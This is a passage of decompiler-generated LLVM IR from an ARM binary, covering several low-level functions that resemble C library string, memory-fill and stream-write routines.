dec_label_pc_11e3c:                               ; preds = %.thread2, %dec_label_pc_11e30, %dec_label_pc_11e00, %dec_label_pc_11e38
  %v2_11e40 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_11e40, i32* @r4, align 4
  %v1_11e44 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_11e44

; uselistorder directives
  uselistorder i32 %v0_11de8, { 1, 0 }
  uselistorder i32 %v0_11dd0, { 1, 0 }
  uselistorder i32 %v0_11d94, { 0, 1, 2, 3, 4, 6, 5, 7 }
  uselistorder i32 %v0_11d58, { 1, 0, 2 }
  uselistorder i16* %tmp, { 1, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r0.global-to-local, { 9, 3, 4, 11, 5, 6, 7, 12, 2, 8, 10, 0, 1 }
  uselistorder i32 %arg2, { 0, 1, 2, 3, 5, 4 }
  uselistorder label %dec_label_pc_11e3c, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_11e38, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11e30, { 1, 2, 0, 3, 4 }
  uselistorder label %dec_label_pc_11d70, { 1, 0 }
}

define i32 @function_11e48(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_11e48:
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_11e48 = load i32, i32* @r4, align 4
  store i32 %v3_11e48, i32* %stack_var_-16, align 4
  %v6_11e48 = load i32, i32* @r5, align 4
  %v9_11e48 = load i32, i32* @r6, align 4
  store i32 %arg2, i32* @r5, align 4
  store i32 %arg1, i32* @r4, align 4
  %v0_11e54 = call i32 @function_11fd0()
  store i32 %v0_11e54, i32* @r6, align 4
  %v0_11e5c = load i32, i32* @r5, align 4
  %v0_11e60 = load i32, i32* @r4, align 4
  %v4_11e6c = inttoptr i32 %v0_11e5c to i16*
  %v5_11e6c = call i32 @function_11e80(i32 %v0_11e60, i32 1, i32 %v0_11e54, i16* %v4_11e6c)
  %v1_11e70 = load i32, i32* @r6, align 4
  %v9_11e70 = icmp eq i32 %v5_11e6c, %v1_11e70
  br i1 %v9_11e70, label %bb6, label %bb

bb:                                               ; preds = %dec_label_pc_11e48
  br label %bb6

bb6:                                              ; preds = %dec_label_pc_11e48, %bb
  %v1_11e7c = phi i32 [ %v5_11e6c, %dec_label_pc_11e48 ], [ -1, %bb ]
  %v2_11e78 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_11e78, i32* @r4, align 4
  store i32 %v6_11e48, i32* @r5, align 4
  store i32 %v9_11e48, i32* @r6, align 4
  ret i32 %v1_11e7c

; uselistorder directives
  uselistorder label %bb6, { 1, 0 }
}

define i32 @function_11e80(i32 %arg1, i32 %arg2, i32 %arg3, i16* %arg4) local_unnamed_addr {
dec_label_pc_11e80:
  %tmp = ptrtoint i16* %arg4 to i32
  %v9_11e80 = load i32, i32* @r6, align 4
  %v12_11e80 = load i32, i32* @r7, align 4
  store i32 %tmp, i32* @r5, align 4
  %v3_11e88 = load i16, i16* %arg4, align 2
  %v1_11e8c = and i16 %v3_11e88, 192
  %v2_11e90 = icmp eq i16 %v1_11e8c, 192
  store i32 %arg1, i32* @r7, align 4
  store i32 %arg2, i32* @r4, align 4
  store i32 %arg3, i32* @r6, align 4
  br i1 %v2_11e90, label %dec_label_pc_11ebc, label %dec_label_pc_11ea8

dec_label_pc_11ea8:                               ; preds = %dec_label_pc_11e80
  %v4_11eb0 = call i32 @function_162c0(i16* nonnull %arg4, i32 128)
  %v2_11eb4 = icmp eq i32 %v4_11eb0, 0
  br i1 %v2_11eb4, label %dec_label_pc_11ebcthread-pre-split, label %dec_label_pc_11f1c

dec_label_pc_11ebcthread-pre-split:               ; preds = %dec_label_pc_11ea8
  %v0_11ebc.pr = load i32, i32* @r4, align 4
  br label %dec_label_pc_11ebc

dec_label_pc_11ebc:                               ; preds = %dec_label_pc_11ebcthread-pre-split, %dec_label_pc_11e80
  %v0_11ecc = phi i32 [ %v0_11ebc.pr, %dec_label_pc_11ebcthread-pre-split ], [ %arg2, %dec_label_pc_11e80 ]
  %v2_11ebc = icmp eq i32 %v0_11ecc, 0
  br i1 %v2_11ebc, label %dec_label_pc_11f1c, label %bb

bb:                                               ; preds = %dec_label_pc_11ebc
  %v1_11ec0 = load i32, i32* @r6, align 4
  %v3_11ec0 = icmp eq i32 %v1_11ec0, 0
  br i1 %v3_11ec0, label %dec_label_pc_11f1c, label %dec_label_pc_11ec8

dec_label_pc_11ec8:                               ; preds = %bb
  store i32 -1, i32* @r0, align 4
  store i32 %v0_11ecc, i32* @r1, align 4
  %v0_11ed0 = call i32 @function_102cc()
  %v0_11ed4 = load i32, i32* @r6, align 4
  %tmp9 = icmp ugt i32 %v0_11ed4, %v0_11ed0
  %v0_11efc = load i32, i32* @r5, align 4
  %v1_11efc = inttoptr i32 %v0_11efc to i16*
  br i1 %tmp9, label %dec_label_pc_11efc, label %dec_label_pc_11edc

dec_label_pc_11edc:                               ; preds = %dec_label_pc_11ec8
  %v0_11ee0 = load i32, i32* @r4, align 4
  %v2_11ee0 = mul i32 %v0_11ee0, %v0_11ed4
  %v0_11ee4 = load i32, i32* @r7, align 4
  %v5_11ee8 = call i32 @function_16180(i32 %v0_11ee4, i32 %v2_11ee0, i16* %v1_11efc)
  store i32 %v5_11ee8, i32* @r0, align 4
  %v0_11eec = load i32, i32* @r4, align 4
  store i32 %v0_11eec, i32* @r1, align 4
  %v0_11ef0 = call i32 @function_102cc()
  store i32 %v0_11ef0, i32* @r2, align 4
  br label %dec_label_pc_11f20

dec_label_pc_11efc:                               ; preds = %dec_label_pc_11ec8
  %v2_11efc = load i16, i16* %v1_11efc, align 2
  %v1_11f00 = or i16 %v2_11efc, 8
  store i16 %v1_11f00, i16* %v1_11efc, align 2
  %v0_11f08 = call i32 @function_1095c()
  store i32 0, i32* @r2, align 4
  %v2_11f14 = inttoptr i32 %v0_11f08 to i32*
  store i32 22, i32* %v2_11f14, align 4
  %v0_11f20.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_11f20

dec_label_pc_11f1c:                               ; preds = %dec_label_pc_11ebc, %dec_label_pc_11ea8, %bb
  store i32 0, i32* @r2, align 4
  br label %dec_label_pc_11f20

dec_label_pc_11f20:                               ; preds = %dec_label_pc_11efc, %dec_label_pc_11edc, %dec_label_pc_11f1c
  %v0_11f20 = phi i32 [ %v0_11f20.pre, %dec_label_pc_11efc ], [ %v0_11ef0, %dec_label_pc_11edc ], [ 0, %dec_label_pc_11f1c ]
  store i32 %v9_11e80, i32* @r6, align 4
  store i32 %v12_11e80, i32* @r7, align 4
  ret i32 %v0_11f20

; uselistorder directives
  uselistorder i16* %v1_11efc, { 0, 2, 1 }
  uselistorder i32 %v0_11ed4, { 1, 0 }
  uselistorder i32 (i32, i32, i16*)* @function_16180, { 4, 0, 1, 3, 2 }
  uselistorder i32 (i16*, i32)* @function_162c0, { 1, 2, 0 }
  uselistorder label %dec_label_pc_11f20, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11f1c, { 2, 0, 1 }
}

define i32 @function_11f30(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_11f30:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @r3, align 4
  %v0_11f34 = load i32, i32* @r2, align 4
  %v8_11f34 = icmp eq i32 %v0_11f34, 8
  store i1 %v8_11f34, i1* %cpsr_z.global-to-local, align 1
  %v5_11f38 = icmp slt i32 %v0_11f34, 8
  br i1 %v5_11f38, label %dec_label_pc_11f98, label %dec_label_pc_11f3c

dec_label_pc_11f3c:                               ; preds = %dec_label_pc_11f30
  %v4_11f3c = mul i32 %arg2, 256
  %v5_11f3c = or i32 %v4_11f3c, %arg2
  %v4_11f40 = mul i32 %v5_11f3c, 65536
  %v5_11f40 = or i32 %v4_11f40, %v5_11f3c
  store i32 %v5_11f40, i32* %r1.global-to-local, align 4
  %v1_11f4457 = urem i32 %tmp, 4
  %v2_11f4458 = icmp eq i32 %v1_11f4457, 0
  store i1 %v2_11f4458, i1* %cpsr_z.global-to-local, align 1
  %extract.t83 = trunc i32 %arg2 to i8
  br i1 %v2_11f4458, label %dec_label_pc_11f54, label %bb

bb:                                               ; preds = %dec_label_pc_11f3c, %.thread.bb_crit_edge
  %arg2.sink.off0 = phi i8 [ %extract.t82, %.thread.bb_crit_edge ], [ %extract.t83, %dec_label_pc_11f3c ]
  %v3_11f4859 = phi i32 [ %v6_11f48, %.thread.bb_crit_edge ], [ %tmp, %dec_label_pc_11f3c ]
  %v4_11f48 = inttoptr i32 %v3_11f4859 to i8*
  store i8 %arg2.sink.off0, i8* %v4_11f48, align 1
  %v5_11f48 = load i32, i32* @r3, align 4
  %v6_11f48 = add i32 %v5_11f48, 1
  store i32 %v6_11f48, i32* @r3, align 4
  %v0_11f4c.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  %v0_11f58.pr.pre = load i32, i32* @r2, align 4
  br i1 %v0_11f4c.pr, label %dec_label_pc_11f54, label %.thread

.thread:                                          ; preds = %bb
  %v2_11f4c = add i32 %v0_11f58.pr.pre, -1
  store i32 %v2_11f4c, i32* @r2, align 4
  %v1_11f44 = urem i32 %v6_11f48, 4
  %v2_11f44 = icmp eq i32 %v1_11f44, 0
  store i1 %v2_11f44, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11f44, label %dec_label_pc_11f54, label %.thread.bb_crit_edge

.thread.bb_crit_edge:                             ; preds = %.thread
  %v1_11f48.pre = load i32, i32* %r1.global-to-local, align 4
  %extract.t82 = trunc i32 %v1_11f48.pre to i8
  br label %bb

dec_label_pc_11f54:                               ; preds = %.thread, %bb, %dec_label_pc_11f3c
  %v0_11f6028 = phi i32 [ %tmp, %dec_label_pc_11f3c ], [ %v6_11f48, %bb ], [ %v6_11f48, %.thread ]
  %v0_11f58.pr = phi i32 [ %v0_11f34, %dec_label_pc_11f3c ], [ %v0_11f58.pr.pre, %bb ], [ %v2_11f4c, %.thread ]
  %v0_11f54 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_11f54, i32* @ip, align 4
  %v8_11f5810 = icmp eq i32 %v0_11f58.pr, 8
  store i1 %v8_11f5810, i1* %cpsr_z.global-to-local, align 1
  %v5_11f5c11 = icmp slt i32 %v0_11f58.pr, 8
  br i1 %v5_11f5c11, label %dec_label_pc_11f98, label %dec_label_pc_11f60.preheader

dec_label_pc_11f60.preheader:                     ; preds = %dec_label_pc_11f54
  %v1_11f6046 = inttoptr i32 %v0_11f6028 to i32*
  store i32 %v0_11f54, i32* %v1_11f6046, align 4
  %v3_11f6047 = add i32 %v0_11f6028, 4
  %v4_11f6048 = inttoptr i32 %v3_11f6047 to i32*
  %v5_11f6049 = load i32, i32* @ip, align 4
  store i32 %v5_11f6049, i32* %v4_11f6048, align 4
  %v6_11f6050 = add i32 %v0_11f6028, 8
  store i32 %v6_11f6050, i32* @r3, align 4
  %v0_11f6451 = load i32, i32* @r2, align 4
  %v1_11f6452 = add i32 %v0_11f6451, -8
  store i32 %v1_11f6452, i32* %r2.global-to-local, align 4
  %v5_11f6c53 = icmp slt i32 %v1_11f6452, 8
  br i1 %v5_11f6c53, label %dec_label_pc_11f60.dec_label_pc_11f98.loopexit_crit_edge, label %dec_label_pc_11f70

dec_label_pc_11f70:                               ; preds = %dec_label_pc_11f60.preheader, %dec_label_pc_11f58.dec_label_pc_11f60_crit_edge
  %v6_11f6055 = phi i32 [ %v6_11f60, %dec_label_pc_11f58.dec_label_pc_11f60_crit_edge ], [ %v6_11f6050, %dec_label_pc_11f60.preheader ]
  %v0_11f6054 = phi i32 [ %v12_11f8c, %dec_label_pc_11f58.dec_label_pc_11f60_crit_edge ], [ %v0_11f6028, %dec_label_pc_11f60.preheader ]
  %v1_11f70 = inttoptr i32 %v6_11f6055 to i32*
  %v2_11f70 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v2_11f70, i32* %v1_11f70, align 4
  %v3_11f70 = add i32 %v0_11f6054, 12
  %v4_11f70 = inttoptr i32 %v3_11f70 to i32*
  %v5_11f70 = load i32, i32* @ip, align 4
  store i32 %v5_11f70, i32* %v4_11f70, align 4
  %v6_11f70 = add i32 %v0_11f6054, 16
  store i32 %v6_11f70, i32* @r3, align 4
  %v0_11f74 = load i32, i32* %r2.global-to-local, align 4
  %v1_11f74 = add i32 %v0_11f74, -8
  store i32 %v1_11f74, i32* %r2.global-to-local, align 4
  %v5_11f7c = icmp slt i32 %v1_11f74, 8
  br i1 %v5_11f7c, label %dec_label_pc_11f70.dec_label_pc_11f98.loopexit_crit_edge, label %dec_label_pc_11f80

dec_label_pc_11f80:                               ; preds = %dec_label_pc_11f70
  %v1_11f80 = inttoptr i32 %v6_11f70 to i32*
  %v2_11f80 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v2_11f80, i32* %v1_11f80, align 4
  %v3_11f80 = add i32 %v0_11f6054, 20
  %v4_11f80 = inttoptr i32 %v3_11f80 to i32*
  %v5_11f80 = load i32, i32* @ip, align 4
  store i32 %v5_11f80, i32* %v4_11f80, align 4
  %v6_11f80 = add i32 %v0_11f6054, 24
  store i32 %v6_11f80, i32* @r3, align 4
  %v0_11f84 = load i32, i32* %r2.global-to-local, align 4
  %v1_11f84 = add i32 %v0_11f84, -8
  store i32 %v1_11f84, i32* %r2.global-to-local, align 4
  %v5_11f8c = icmp slt i32 %v1_11f84, 8
  br i1 %v5_11f8c, label %dec_label_pc_11f80.dec_label_pc_11f98.loopexit_crit_edge, label %dec_label_pc_11f58

dec_label_pc_11f58:                               ; preds = %dec_label_pc_11f80
  %v7_11f8c = inttoptr i32 %v6_11f80 to i32*
  %v8_11f8c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v8_11f8c, i32* %v7_11f8c, align 4
  %v9_11f8c = add i32 %v0_11f6054, 28
  %v10_11f8c = inttoptr i32 %v9_11f8c to i32*
  %v11_11f8c = load i32, i32* @ip, align 4
  store i32 %v11_11f8c, i32* %v10_11f8c, align 4
  %v12_11f8c = add i32 %v0_11f6054, 32
  store i32 %v12_11f8c, i32* @r3, align 4
  %v6_11f90 = load i32, i32* %r2.global-to-local, align 4
  %v7_11f90 = add i32 %v6_11f90, -8
  store i32 %v7_11f90, i32* %r2.global-to-local, align 4
  %v5_11f5c = icmp slt i32 %v7_11f90, 8
  br i1 %v5_11f5c, label %dec_label_pc_11f58.dec_label_pc_11f98.loopexit_crit_edge, label %dec_label_pc_11f58.dec_label_pc_11f60_crit_edge

dec_label_pc_11f58.dec_label_pc_11f60_crit_edge:  ; preds = %dec_label_pc_11f58
  %v2_11f60.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_11f60 = inttoptr i32 %v12_11f8c to i32*
  store i32 %v2_11f60.pre, i32* %v1_11f60, align 4
  %v3_11f60 = add i32 %v0_11f6054, 36
  %v4_11f60 = inttoptr i32 %v3_11f60 to i32*
  %v5_11f60 = load i32, i32* @ip, align 4
  store i32 %v5_11f60, i32* %v4_11f60, align 4
  %v6_11f60 = add i32 %v0_11f6054, 40
  store i32 %v6_11f60, i32* @r3, align 4
  %v0_11f64 = load i32, i32* %r2.global-to-local, align 4
  %v1_11f64 = add i32 %v0_11f64, -8
  store i32 %v1_11f64, i32* %r2.global-to-local, align 4
  %v5_11f6c = icmp slt i32 %v1_11f64, 8
  br i1 %v5_11f6c, label %dec_label_pc_11f60.dec_label_pc_11f98.loopexit_crit_edge, label %dec_label_pc_11f70

dec_label_pc_11f58.dec_label_pc_11f98.loopexit_crit_edge: ; preds = %dec_label_pc_11f58
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_11f98

dec_label_pc_11f60.dec_label_pc_11f98.loopexit_crit_edge: ; preds = %dec_label_pc_11f58.dec_label_pc_11f60_crit_edge, %dec_label_pc_11f60.preheader
  %v1_11f64.lcssa = phi i32 [ %v1_11f6452, %dec_label_pc_11f60.preheader ], [ %v1_11f64, %dec_label_pc_11f58.dec_label_pc_11f60_crit_edge ]
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_11f98

dec_label_pc_11f70.dec_label_pc_11f98.loopexit_crit_edge: ; preds = %dec_label_pc_11f70
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_11f98

dec_label_pc_11f80.dec_label_pc_11f98.loopexit_crit_edge: ; preds = %dec_label_pc_11f80
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_11f98

dec_label_pc_11f98:                               ; preds = %dec_label_pc_11f54, %dec_label_pc_11f58.dec_label_pc_11f98.loopexit_crit_edge, %dec_label_pc_11f60.dec_label_pc_11f98.loopexit_crit_edge, %dec_label_pc_11f70.dec_label_pc_11f98.loopexit_crit_edge, %dec_label_pc_11f80.dec_label_pc_11f98.loopexit_crit_edge, %dec_label_pc_11f30
  %v0_11fa0 = phi i32 [ %v0_11f34, %dec_label_pc_11f30 ], [ %v1_11f84, %dec_label_pc_11f80.dec_label_pc_11f98.loopexit_crit_edge ], [ %v1_11f74, %dec_label_pc_11f70.dec_label_pc_11f98.loopexit_crit_edge ], [ %v1_11f64.lcssa, %dec_label_pc_11f60.dec_label_pc_11f98.loopexit_crit_edge ], [ %v7_11f90, %dec_label_pc_11f58.dec_label_pc_11f98.loopexit_crit_edge ], [ %v0_11f58.pr, %dec_label_pc_11f54 ]
  %v2_11f98 = icmp eq i32 %v0_11fa0, 0
  store i1 %v2_11f98, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11f98, label %bb32, label %bb33

bb32:                                             ; preds = %dec_label_pc_11f98
  ret i32 %tmp

bb33:                                             ; preds = %dec_label_pc_11f98
  %v1_11fa0 = sub i32 7, %v0_11fa0
  store i32 %v1_11fa0, i32* %r2.global-to-local, align 4
  %v3_11fa4 = mul i32 %v1_11fa0, 4
  %v4_11fa4 = add i32 %v3_11fa4, ptrtoint (i32* @global_var_11fac.243 to i32)
  call void @__pseudo_branch(i32 %v4_11fa4)
  %v0_11fac = load i32, i32* %r1.global-to-local, align 4
  %v1_11fac = trunc i32 %v0_11fac to i8
  %v2_11fac = load i32, i32* @r3, align 4
  %v3_11fac = inttoptr i32 %v2_11fac to i8*
  store i8 %v1_11fac, i8* %v3_11fac, align 1
  %v4_11fac = load i32, i32* @r3, align 4
  %v5_11fac = add i32 %v4_11fac, 1
  store i32 %v5_11fac, i32* %r3.global-to-local, align 4
  %v0_11fb0 = load i32, i32* %r1.global-to-local, align 4
  %v1_11fb0 = trunc i32 %v0_11fb0 to i8
  %v3_11fb0 = inttoptr i32 %v5_11fac to i8*
  store i8 %v1_11fb0, i8* %v3_11fb0, align 1
  %v4_11fb0 = load i32, i32* %r3.global-to-local, align 4
  %v5_11fb0 = add i32 %v4_11fb0, 1
  store i32 %v5_11fb0, i32* %r3.global-to-local, align 4
  %v0_11fb4 = load i32, i32* %r1.global-to-local, align 4
  %v1_11fb4 = trunc i32 %v0_11fb4 to i8
  %v3_11fb4 = inttoptr i32 %v5_11fb0 to i8*
  store i8 %v1_11fb4, i8* %v3_11fb4, align 1
  %v4_11fb4 = load i32, i32* %r3.global-to-local, align 4
  %v5_11fb4 = add i32 %v4_11fb4, 1
  store i32 %v5_11fb4, i32* %r3.global-to-local, align 4
  %v0_11fb8 = load i32, i32* %r1.global-to-local, align 4
  %v1_11fb8 = trunc i32 %v0_11fb8 to i8
  %v3_11fb8 = inttoptr i32 %v5_11fb4 to i8*
  store i8 %v1_11fb8, i8* %v3_11fb8, align 1
  %v4_11fb8 = load i32, i32* %r3.global-to-local, align 4
  %v5_11fb8 = add i32 %v4_11fb8, 1
  store i32 %v5_11fb8, i32* %r3.global-to-local, align 4
  %v0_11fbc = load i32, i32* %r1.global-to-local, align 4
  %v1_11fbc = trunc i32 %v0_11fbc to i8
  %v3_11fbc = inttoptr i32 %v5_11fb8 to i8*
  store i8 %v1_11fbc, i8* %v3_11fbc, align 1
  %v4_11fbc = load i32, i32* %r3.global-to-local, align 4
  %v5_11fbc = add i32 %v4_11fbc, 1
  store i32 %v5_11fbc, i32* %r3.global-to-local, align 4
  %v0_11fc0 = load i32, i32* %r1.global-to-local, align 4
  %v1_11fc0 = trunc i32 %v0_11fc0 to i8
  %v3_11fc0 = inttoptr i32 %v5_11fbc to i8*
  store i8 %v1_11fc0, i8* %v3_11fc0, align 1
  %v4_11fc0 = load i32, i32* %r3.global-to-local, align 4
  %v5_11fc0 = add i32 %v4_11fc0, 1
  store i32 %v5_11fc0, i32* %r3.global-to-local, align 4
  %v0_11fc4 = load i32, i32* %r1.global-to-local, align 4
  %v1_11fc4 = trunc i32 %v0_11fc4 to i8
  %v3_11fc4 = inttoptr i32 %v5_11fc0 to i8*
  store i8 %v1_11fc4, i8* %v3_11fc4, align 1
  %v4_11fc4 = load i32, i32* %r3.global-to-local, align 4
  %v5_11fc4 = add i32 %v4_11fc4, 1
  store i32 %v5_11fc4, i32* @r3, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %v6_11f60, { 1, 0 }
  uselistorder i32 %v12_11f8c, { 1, 2, 0 }
  uselistorder i32 %v0_11f6054, { 0, 1, 7, 6, 5, 4, 3, 2 }
  uselistorder i32 %v0_11f58.pr, { 0, 2, 1 }
  uselistorder i32 %v6_11f48, { 2, 3, 0, 4, 1 }
  uselistorder i32 %v5_11f3c, { 1, 0 }
  uselistorder i32 %v0_11f34, { 1, 0, 2, 3 }
  uselistorder i32 %tmp, { 3, 4, 2, 1, 0, 5 }
  uselistorder i32* %r2.global-to-local, { 1, 9, 2, 3, 4, 5, 6, 7, 8, 0 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 4, 5, 9, 7, 6, 1, 10, 11, 12, 13, 8, 14, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 6, 2, 4, 1, 3, 0, 8, 7, 5, 9 }
  uselistorder i32 %arg2, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_11f98, { 4, 3, 2, 1, 0, 5 }
  uselistorder label %dec_label_pc_11f70, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
}

define i32 @function_11fd0() local_unnamed_addr {
dec_label_pc_11fd0:
  %v0_11fd0 = load i32, i32* @r0, align 4
  %v1_11fd0 = and i32 %v0_11fd0, -4
  %v1_11fd4 = inttoptr i32 %v1_11fd0 to i32*
  %v2_11fd4 = load i32, i32* %v1_11fd4, align 4
  %v1_11fd8 = urem i32 %v0_11fd0, 4
  store i32 %v1_11fd8, i32* @r3, align 4
  %v2_11fd8 = icmp eq i32 %v1_11fd8, 0
  %v1_11fdc = sub nsw i32 0, %v1_11fd8
  br i1 %v2_11fd8, label %.preheader.preheader, label %dec_label_pc_11fe4

dec_label_pc_11fe4:                               ; preds = %dec_label_pc_11fd0
  %v1_11fe4 = or i32 %v2_11fd4, 255
  %v7_11fe8 = icmp eq i32 %v1_11fd8, 1
  br i1 %v7_11fe8, label %bb33, label %bb

bb:                                               ; preds = %dec_label_pc_11fe4
  %v9_11fec = or i32 %v2_11fd4, 65535
  br label %bb33

bb33:                                             ; preds = %dec_label_pc_11fe4, %bb
  %v8_11ff4 = phi i32 [ %v1_11fe4, %dec_label_pc_11fe4 ], [ %v9_11fec, %bb ]
  %v1_11ff0 = add nsw i32 %v1_11fd8, -2
  store i32 %v1_11ff0, i32* @r3, align 4
  %v7_11ff4 = icmp eq i32 %v1_11fd8, 3
  br i1 %v7_11ff4, label %bb34, label %.preheader.preheader

bb34:                                             ; preds = %bb33
  %v9_11ff4 = or i32 %v8_11ff4, 16711680
  br label %.preheader.preheader

.preheader.preheader:                             ; preds = %bb33, %bb34, %dec_label_pc_11fd0
  %v1_12004.ph = phi i32 [ %v2_11fd4, %dec_label_pc_11fd0 ], [ %v9_11ff4, %bb34 ], [ %v8_11ff4, %bb33 ]
  %v1_11ff838 = urem i32 %v1_12004.ph, 256
  %v2_11ff839 = icmp eq i32 %v1_11ff838, 0
  %v2_11ffc40 = and i32 %v1_12004.ph, 65280
  %v3_11ffc41 = icmp eq i32 %v2_11ffc40, 0
  %or.cond42 = or i1 %v2_11ff839, %v3_11ffc41
  %v2_1200043 = and i32 %v1_12004.ph, 16711680
  %v3_1200044 = icmp eq i32 %v2_1200043, 0
  %or.cond3145 = or i1 %v3_1200044, %or.cond42
  %v4_1200446 = icmp ult i32 %v1_12004.ph, 16777216
  %or.cond3247 = or i1 %v4_1200446, %or.cond3145
  br i1 %or.cond3247, label %dec_label_pc_12014, label %.thread4

.thread4:                                         ; preds = %.preheader.preheader, %.thread4
  %v1_120081349 = phi i32 [ %v2_1200814, %.thread4 ], [ %v1_11fdc, %.preheader.preheader ]
  %v1_1200c48.in = phi i32 [ %v1_1200c48, %.thread4 ], [ %v1_11fd0, %.preheader.preheader ]
  %v1_1200c48 = add i32 %v1_1200c48.in, 4
  %v2_1200814 = add i32 %v1_120081349, 4
  %v2_1200c = inttoptr i32 %v1_1200c48 to i32*
  %v3_1200c = load i32, i32* %v2_1200c, align 4
  %v1_11ff8 = urem i32 %v3_1200c, 256
  %v2_11ff8 = icmp eq i32 %v1_11ff8, 0
  %v2_11ffc = and i32 %v3_1200c, 65280
  %v3_11ffc = icmp eq i32 %v2_11ffc, 0
  %or.cond = or i1 %v2_11ff8, %v3_11ffc
  %v2_12000 = and i32 %v3_1200c, 16711680
  %v3_12000 = icmp eq i32 %v2_12000, 0
  %or.cond31 = or i1 %v3_12000, %or.cond
  %v4_12004 = icmp ult i32 %v3_1200c, 16777216
  %or.cond32 = or i1 %v4_12004, %or.cond31
  br i1 %or.cond32, label %dec_label_pc_12014, label %.thread4

dec_label_pc_12014:                               ; preds = %.thread4, %.preheader.preheader
  %v1_1200813.lcssa = phi i32 [ %v1_11fdc, %.preheader.preheader ], [ %v2_1200814, %.thread4 ]
  %v2_11ff8.lcssa = phi i1 [ %v2_11ff839, %.preheader.preheader ], [ %v2_11ff8, %.thread4 ]
  %v3_11ffc.lcssa = phi i1 [ %v3_11ffc41, %.preheader.preheader ], [ %v3_11ffc, %.thread4 ]
  %v3_12000.lcssa = phi i1 [ %v3_1200044, %.preheader.preheader ], [ %v3_12000, %.thread4 ]
  br i1 %v2_11ff8.lcssa, label %.thread10, label %bb35

bb35:                                             ; preds = %dec_label_pc_12014
  %v2_12018 = add i32 %v1_1200813.lcssa, 1
  br i1 %v3_11ffc.lcssa, label %.thread10, label %bb36

bb36:                                             ; preds = %bb35
  %v2_1202017 = add i32 %v1_1200813.lcssa, 2
  br i1 %v3_12000.lcssa, label %.thread10, label %bb37

bb37:                                             ; preds = %bb36
  %v2_12028 = add i32 %v1_1200813.lcssa, 3
  br label %.thread10

.thread10:                                        ; preds = %dec_label_pc_12014, %bb35, %bb36, %bb37
  %v1_1202c = phi i32 [ %v2_12018, %bb35 ], [ %v2_1202017, %bb36 ], [ %v2_12028, %bb37 ], [ %v1_1200813.lcssa, %dec_label_pc_12014 ]
  ret i32 %v1_1202c

; uselistorder directives
  uselistorder i32 %v1_1200813.lcssa, { 1, 3, 2, 0 }
  uselistorder i32 %v3_1200c, { 3, 2, 1, 0 }
  uselistorder i32 %v1_12004.ph, { 1, 2, 3, 0 }
  uselistorder i32 %v1_11fd8, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 16711680, { 1, 0, 2 }
  uselistorder label %.thread10, { 3, 2, 1, 0 }
  uselistorder label %.thread4, { 1, 0 }
  uselistorder label %.preheader.preheader, { 1, 0, 2 }
  uselistorder label %bb33, { 1, 0 }
}

define i32 @function_12030(i8* %arg1, i32 %arg2) local_unnamed_addr {
bb:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_12034.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_12030

dec_label_pc_12030:                               ; preds = %bb3, %bb
  %v0_12034 = phi i32 [ %v0_12034.pre, %bb ], [ %v5_12034, %bb3 ]
  %v0_12030 = phi i32 [ %tmp, %bb ], [ %v5_12030, %bb3 ]
  %v1_12030 = inttoptr i32 %v0_12030 to i8*
  %v2_12030 = load i8, i8* %v1_12030, align 1
  %v3_12030 = zext i8 %v2_12030 to i32
  store i32 %v3_12030, i32* @r2, align 4
  %v1_12034 = inttoptr i32 %v0_12034 to i8*
  %v2_12034 = load i8, i8* %v1_12034, align 1
  %v3_12034 = zext i8 %v2_12034 to i32
  %v2_12038 = icmp eq i8 %v2_12030, 0
  br i1 %v2_12038, label %.dec_label_pc_12044_crit_edge, label %bb3

bb3:                                              ; preds = %dec_label_pc_12030
  %v5_12034 = add i32 %v0_12034, 1
  %v5_12030 = add i32 %v0_12030, 1
  %v10_1203c = icmp eq i8 %v2_12030, %v2_12034
  br i1 %v10_1203c, label %dec_label_pc_12030, label %dec_label_pc_12044

.dec_label_pc_12044_crit_edge:                    ; preds = %dec_label_pc_12030
  br label %dec_label_pc_12044

dec_label_pc_12044:                               ; preds = %bb3, %.dec_label_pc_12044_crit_edge
  %.pn = phi i32 [ 0, %.dec_label_pc_12044_crit_edge ], [ %v3_12030, %bb3 ]
  %v2_12044.pre-phi = sub nsw i32 %.pn, %v3_12034
  ret i32 %v2_12044.pre-phi

; uselistorder directives
  uselistorder i32 %v0_12030, { 1, 0 }
  uselistorder i32 %v0_12034, { 1, 0 }
  uselistorder label %dec_label_pc_12044, { 1, 0 }
}

define i32 @function_12050() local_unnamed_addr {
dec_label_pc_12050:
  %v0_12050 = call i32 @function_17480()
  ret i32 %v0_12050
}

